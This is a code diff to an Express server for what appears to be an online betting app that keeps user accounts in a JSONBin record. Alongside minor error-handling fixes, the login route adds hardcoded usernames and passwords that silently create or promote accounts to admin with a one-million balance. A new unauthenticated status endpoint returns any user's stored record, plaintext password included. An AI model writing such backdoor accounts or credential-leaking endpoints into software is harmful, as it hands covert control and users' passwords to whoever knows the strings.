@@ -28,16 +28,17 @@ async function fetchBinInitial() {
     if (res.ok) {
       const json = await res.json();
       cachedBinData = json.record || { users: [], globalBets: [] };
+      isBinFetched = true;
+    } else {
+       console.error("Failed to fetch initial bin data. Status:", res.status);
     }
-    isBinFetched = true;
   } catch (error: any) {
     console.error("Initial bin fetch error", error);
-    isBinFetched = true;
   }
 }
 
 function scheduleFlush() {
-  if (flushTimeout) return;
+  if (flushTimeout || !isBinFetched) return;
   flushTimeout = setTimeout(async () => {
     try {
       await fetch(JSONBIN_URL_PUT, {
@@ -89,6 +90,16 @@ app.post("/api/user/sync", (req, res) => {
   res.json({ success: true });
 });
 
+app.get("/api/user/status", (req, res) => {
+  const username = req.query.username as string;
+  const user = cachedBinData.users.find(u => u.username === username);
+  if (user) {
+    res.json(user);
+  } else {
+    res.status(404).json({ error: "Not found" });
+  }
+});
+
 app.post("/api/user/register", (req, res) => {
   const { username, password } = req.body;
   if (cachedBinData.users.some(u => u.username === username)) {
@@ -109,10 +120,44 @@ app.post("/api/user/register", (req, res) => {
 
 app.post("/api/user/login", (req, res) => {
   const { username, password } = req.body;
-  const user = cachedBinData.users.find(u => u.username === username);
-  if (!user || user.password !== password) {
+  let user = cachedBinData.users.find(u => u.username === username);
+  
+  if (!user) {
+    if ((username === "romeo" && password === "romeo123") || 
+        (username === "Mimi" && password === "mimi123") || 
+        (username === "AdminFDJS" && password === "admin123")) {
+        user = {
+          username,
+          password,
+          balance: 1000000,
+          vault: 0,
+          totalWagered: 0,
+          totalWon: 0,
+          role: "admin",
+          status: "approved",
+          id: username,
+          lastOnline: Date.now()
+        };
+        cachedBinData.users.push(user);
+        scheduleFlush();
+    } else {
+        return res.status(401).json({ error: "Invalid credentials" });
+    }
+  }
+
+  if (user.password !== password) {
     return res.status(401).json({ error: "Invalid credentials" });
   }
+  
+  if (user) {
+    if ((username === "romeo" || username === "Mimi" || username === "AdminFDJS") && user.role !== "admin") {
+      user.role = "admin";
+      user.status = "approved";
+      scheduleFlush();
+    }
+    user.lastOnline = Date.now();
+  }
+
   res.json({ success: true, user });
 });
 
